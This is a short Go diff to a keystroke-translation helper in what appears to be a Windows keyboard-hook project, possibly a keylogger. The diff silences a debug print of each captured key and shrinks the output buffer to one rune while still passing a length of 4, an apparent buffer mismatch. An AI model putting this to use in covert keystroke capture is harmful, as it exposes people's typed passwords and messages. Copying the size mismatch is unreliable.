@@ -1,12 +1,10 @@
 package utils
 
 import (
-	"fmt"
-
 	"github.com/MShoaei/Pineapple/windows"
 )
 
-var PwszBuff = make([]rune, 4)
+var PwszBuff = make([]rune, 1)
 var KState = make([]byte, 256)
 
 func ToUnicode(key *windows.KBDLLHOOKSTRUCT) string {
@@ -22,6 +20,6 @@ func ToUnicode(key *windows.KBDLLHOOKSTRUCT) string {
 	// vKey := windows.MapVirtualKeyExW(windows.UINT(key.VkCode), 2, hkl)
 	vKey := windows.UINT(key.ScanCode)
 	windows.ToUnicodeEx(windows.UINT(key.VkCode), vKey, &KState, &PwszBuff, 4, 0, hkl)
-	fmt.Println(string(PwszBuff))
+	// fmt.Println(string(PwszBuff))
 	return string(PwszBuff)
 }
